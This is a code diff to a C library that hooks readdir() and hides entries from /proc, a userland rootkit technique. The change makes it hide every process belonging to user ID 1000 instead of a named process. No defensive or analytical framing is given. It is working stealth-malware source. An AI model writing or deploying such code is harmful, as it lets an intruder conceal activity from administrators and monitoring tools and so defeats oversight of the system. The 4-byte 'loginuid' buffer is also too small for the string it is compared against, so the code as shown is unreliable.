@@ -7,9 +7,9 @@
 #include <unistd.h>
 
 /*
- * Every process with this name will be excluded
+ * Every process of this user(uid) will be excluded
  */
-static const char* process_to_filter = "1000";
+static const char* user_proc_to_filter = "1000";
 
 /*
  * Get a directory name given a DIR* handle
@@ -33,9 +33,9 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
 }
 
 /*
- * Get a process name given its pid
+ * Get a process uid given its pid
  */
-static int get_process_name(char* pid, char* buf)
+static int get_process_uid(char* pid, char* buf)
 {
     if(strspn(pid, "0123456789") != strlen(pid)) {
         return 0;
@@ -83,11 +83,11 @@ struct dirent* readdir(DIR *dirp)                                       \
         dir = original_##readdir(dirp);                                 \
         if(dir) {                                                       \
             char dir_name[256];                                         \
-            char process_name[4];                                     \
+            char loginuid[4];                                           \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                get_process_uid(dir->d_name, loginuid) &&               \
+                strcmp(loginuid, user_proc_to_filter) == 0) {           \
                 continue;                                               \
             }                                                           \
         }                                                               \
